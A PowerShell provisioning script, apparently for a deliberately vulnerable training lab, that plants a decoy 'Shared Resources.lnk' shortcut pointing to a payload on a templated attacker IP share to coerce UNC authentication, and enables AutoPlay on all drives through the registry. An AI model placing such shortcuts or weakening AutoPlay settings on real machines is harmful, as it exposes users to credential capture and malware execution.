$ErrorActionPreference = 'Continue'
$log = 'C:\DunderLab\vuln_ia_phishing.log'
New-Item -ItemType Directory -Force -Path (Split-Path $log) | Out-Null
function Log($m) { Add-Content -Path $log -Value "$(Get-Date -Format o) $m"; Write-Output $m }

# ── IA-052: malicious LNK that triggers UNC authentication ───────────────────
try {
  $lnkPath = '{{ phishing_drop_path }}\Shared Resources.lnk'
  if (Test-Path $lnkPath) {
    Log "OK: IA-052 LNK already present"
  } else {
    $shell = New-Object -ComObject WScript.Shell
    $lnk = $shell.CreateShortcut($lnkPath)
    $lnk.TargetPath   = '\\{{ ia_attacker_ip }}\share\payload.exe'
    $lnk.IconLocation = '%SystemRoot%\system32\shell32.dll,4'
    $lnk.Description  = 'IA-052: LNK UNC coercion'
    $lnk.Save()
    Log "CHANGED: IA-052 LNK created"
  }
} catch { Log "ERROR: IA-052 $($_.Exception.Message)" }

# ── IA-053: AutoPlay enabled for all drives ──────────────────────────────────
try {
  $k = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer'
  if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null }
  Set-ItemProperty -Path $k -Name NoDriveTypeAutoRun -Value 0 -Type DWord
  Log "CHANGED: IA-053 AutoPlay enabled"
} catch { Log "ERROR: IA-053 $($_.Exception.Message)" }

